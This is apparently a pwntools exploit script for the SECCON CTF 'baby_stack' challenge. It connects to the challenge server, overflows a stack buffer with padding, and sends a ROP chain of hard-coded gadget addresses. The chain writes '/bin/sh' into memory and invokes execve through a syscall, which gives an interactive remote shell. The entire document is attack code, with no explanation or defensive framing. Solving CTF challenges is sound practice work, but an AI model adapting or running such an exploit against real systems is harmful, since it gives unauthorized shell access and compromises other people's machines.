#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.6"
port = 8888
host = "baby_stack.pwn.seccon.jp"
port = 15285
r = remote(host,port)


r.recvuntil(">>")
r.sendline("1")
r.recvuntil(">>")
pop_rsi = 0x000000000046defd
pop_rax = 0x00000000004016ea
pop_rdi_xor_drax = 0x0000000000470931
pop_rdx_xor_drax = 0x00000000004a247c
mov_drdi_rax = 0x0000000000456499
syscall = 0x0000000000456889
buf = 0x005a0000-0x300
buf2 = buf + 0x100
context.arch = "amd64"
rop = flat([pop_rax,buf,pop_rdi_xor_drax,buf2,pop_rax,"/bin/sh\x00",mov_drdi_rax,pop_rax,buf,pop_rdi_xor_drax,buf2,pop_rdx_xor_drax,0,pop_rsi,0,pop_rax,0x3b,syscall])
r.sendline("\x00"*400 + 8*"b" + rop )
r.interactive()
